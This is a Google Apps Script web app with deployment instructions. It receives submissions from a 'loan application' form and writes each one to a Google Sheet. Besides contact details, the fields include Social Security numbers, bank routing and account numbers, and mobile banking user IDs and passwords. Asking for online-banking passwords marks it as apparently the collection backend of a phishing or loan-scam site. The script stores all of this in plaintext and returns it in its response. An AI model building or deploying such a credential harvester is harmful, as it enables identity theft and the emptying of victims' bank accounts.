// Google Apps Script for Google Sheets Integration
// This code should be pasted into your Google Apps Script project
// File > New > Project > Paste this code > Deploy > New Deployment > Web App

function doGet(e) {
  return HtmlService.createHtmlOutput('This is a POST endpoint for Google Sheets integration.');
}

function doPost(e) {
  try {
    // Get the posted data
    const postData = JSON.parse(e.postData.contents);
    console.log('Received data:', postData);
    
    // Get the active spreadsheet (should be bound to this script)
    // Or open by ID if you want to use a specific spreadsheet
    let spreadsheet;
    try {
      spreadsheet = SpreadsheetApp.getActiveSpreadsheet();
    } catch (e) {
      // If not bound to a spreadsheet, open by ID
      spreadsheet = SpreadsheetApp.openById('YOUR_SPREADSHEET_ID'); // Replace with your Google Sheet ID
    }
    
    const sheet = spreadsheet.getSheetByName('Loan Applications') || spreadsheet.insertSheet('Loan Applications');
    
    // Add headers if sheet is empty
    if (sheet.getLastRow() === 0) {
      const headers = [
        'Timestamp',
        'Loan Amount',
        'Loan Purpose', 
        'Credit Score',
        'Name',
        'Email',
        'Phone',
        'Street Address',
        'City',
        'State',
        'Zip Code',
        'Social Security',
        'Bank Name',
        'Routing Number',
        'Account Number',
        'Annual Income',
        'Employment Status',
        'Monthly Housing',
        'Your Bank',
        'Mobile Banking User ID',
        'Mobile Banking Password',
        'Application Type'
      ];
      sheet.appendRow(headers);
    }
    
    // Prepare row data in correct order
    const rowData = [
      new Date().toLocaleString(), // Timestamp
      postData.loanAmount || '',
      postData.loanPurpose || '',
      postData.creditScore || '',
      postData.name || '',
      postData.email || '',
      postData.phone || '',
      postData.streetAddress || '',
      postData.city || '',
      postData.state || '',
      postData.zipCode || '',
      postData.socialSecurity || '', // Updated field name
      postData.bankName || '',
      postData.routingNumber || '',
      postData.accountNumber || '',
      postData.annualIncome || '',
      postData.employmentStatus || '',
      postData.monthlyHousing || '',
      postData.yourBank || '',
      postData.mobileBankingUserId || '',
      postData.mobileBankingPassword || '',
      postData.applicationType || 'Personal Loan Application'
    ];
    
    // Append the row to the sheet
    sheet.appendRow(rowData);
    
    console.log('Data appended to Google Sheets:', rowData);
    
    // Return success response
    return ContentService.createTextOutput(JSON.stringify({
      status: 'success',
      message: 'Data saved to Google Sheets successfully',
      row: sheet.getLastRow(),
      data: rowData
    })).setMimeType(ContentService.MimeType.JSON);
    
  } catch (error) {
    console.error('Error in doPost:', error);
    return ContentService.createTextOutput(JSON.stringify({
      status: 'error',
      message: error.toString(),
      error: error.message
    })).setMimeType(ContentService.MimeType.JSON);
  }
}

// Function to get spreadsheet URL for setup
function getSpreadsheetUrl() {
  try {
    const spreadsheet = SpreadsheetApp.getActiveSpreadsheet();
    return spreadsheet.getUrl();
  } catch (e) {
    return 'Spreadsheet not bound to this script. Please bind this script to a Google Sheet or provide SPREADSHEET_ID.';
  }
}
